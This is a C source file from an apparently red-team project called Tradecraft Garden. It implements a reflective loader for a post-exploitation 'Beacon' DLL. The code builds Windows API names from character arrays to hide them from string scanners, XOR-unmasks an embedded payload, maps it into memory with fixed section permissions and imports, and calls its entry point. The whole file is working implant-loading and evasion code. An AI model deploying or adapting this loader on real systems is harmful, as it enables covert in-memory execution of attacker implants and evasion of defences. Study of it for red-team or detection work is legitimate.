/*
 * Copyright (C) 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * This file is part of Tradecraft Garden
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License along
 *  with this program; if not, see <https://www.gnu.org/licenses/>.
 */

/* function prototypes */
void ReflectiveLoader();

/* this is the REAL entry point to this whole mess and it needs to go first! */
__attribute__((noinline, no_reorder)) void go() {
	ReflectiveLoader();
}

/*
 * loader.h is a refactored Reflective Loader and some macros/definitions we need.
 * it has several functions intended to be used across loaders.
 */
#include "loaderdefs.h"
#include "loader.h"

/* build a table of functions we need/want */
#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
	WIN32_FUNC(LoadLibraryA);
	WIN32_FUNC(GetModuleHandleA);
	WIN32_FUNC(GetProcAddress);
	WIN32_FUNC(VirtualProtect);
	WIN32_FUNC(VirtualAlloc);
	WIN32_FUNC(VirtualFree);
} WIN32FUNCS;

__typeof__(GetModuleHandleA) * pGetModuleHandle __attribute__((section(".text")));
__typeof__(GetProcAddress)   * pGetProcAddress  __attribute__((section(".text")));

void findNeededFunctions(WIN32FUNCS * funcs) {

	/*
	 * use pGetModuleHandle & pGetProcAddress
	 * instead of walking the EAT (findFunctionByHash)
	*/

	funcs->GetModuleHandleA = (__typeof__(GetModuleHandleA) *) pGetModuleHandle;
	funcs->GetProcAddress   = (__typeof__(GetProcAddress)   *) pGetProcAddress;

	char k32[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', 0 };
	HMODULE hModule = funcs->GetModuleHandleA(k32);

	char ll[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
	funcs->LoadLibraryA = (__typeof__(LoadLibraryA) *) funcs->GetProcAddress(hModule, ll);

	char va[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
	funcs->VirtualAlloc = (__typeof__(VirtualAlloc) *) funcs->GetProcAddress(hModule, va);

	char vp[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
	funcs->VirtualProtect = (__typeof__(VirtualProtect) *) funcs->GetProcAddress(hModule, vp);

	char fr[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0 };
	funcs->VirtualFree = (__typeof__(VirtualFree) *) funcs->GetProcAddress(hModule, fr);
}

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __BEACON_DLL[0] __attribute__((section("postex_dll")));
char __XOR_KEY[0] __attribute__((section("xor_key")));

char * getLoaderStart() {
	return (char *)&go;
}

char * findPostexDLL() {
	return (char *)&__BEACON_DLL;
}

char * findXorKey() {
	return (char *)&__XOR_KEY;
}

/*
 * Our embedded resources are masked, so we need to unmask them.
 */
typedef struct {
	int   length;
	char  value[];
} _RESOURCE;

char * unmaskAndLoad(WIN32FUNCS * funcs) {
	char      * srcData = findPostexDLL();
	char      * dst;
	
	_RESOURCE * key;
	_RESOURCE * src;

	/* parse our preplen + xor'd $KEY and our masked data too */
	key = (_RESOURCE *)findXorKey();
	src = (_RESOURCE *)srcData;

	/* allocate memory for our unmasked content */
	dst = funcs->VirtualAlloc(NULL, src->length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	/* unmask it */
	for (int x = 0; x < src->length; x++) {
		dst[x] = src->value[x] ^ key->value[x % key->length];
	}

	return dst;
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void ReflectiveLoader() {
	char        * loaderStart;
	char        * rawDll;
	char        * loadedDll;
	
	WIN32FUNCS    funcs;
	DLLDATA       beaconData;
	
	RDATA_SECTION rdata;

	_memset(&rdata, 0, sizeof(RDATA_SECTION));

	/* get start of this loader */
	loaderStart = getLoaderStart();

	/* resolve Win32 functions */
	findNeededFunctions(&funcs);

	/* find Postex DLL appended to this loader */
	rawDll = unmaskAndLoad(&funcs);

	/* parse the Beacon DLL */
	ParseDLL(rawDll, &beaconData);

	/* allocate memory for Beacon */
	loadedDll = funcs.VirtualAlloc(NULL, SizeOfDLL(&beaconData), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	/* load Beacon into memory */
	LoadDLL(&beaconData, rawDll, loadedDll);

	/* process its imports */
	ProcessImports((IMPORTFUNCS *)&funcs, &beaconData, loadedDll);

	/* fix memory permissions and track each section */
	FixSectionsAndTrackRdata((IMPORTFUNCS *)&funcs, &beaconData, loadedDll, &rdata);

	/* get the entry point */
	DLLMAIN_FUNC entryPoint = EntryPoint(&beaconData, loadedDll);

	/* free the unmasked copy */
	funcs.VirtualFree(rawDll, 0, MEM_RELEASE);

	/* call it */
	entryPoint((HINSTANCE)loadedDll, DLL_PROCESS_ATTACH, &rdata);
	entryPoint((HINSTANCE)loaderStart, 0x04, NULL);
}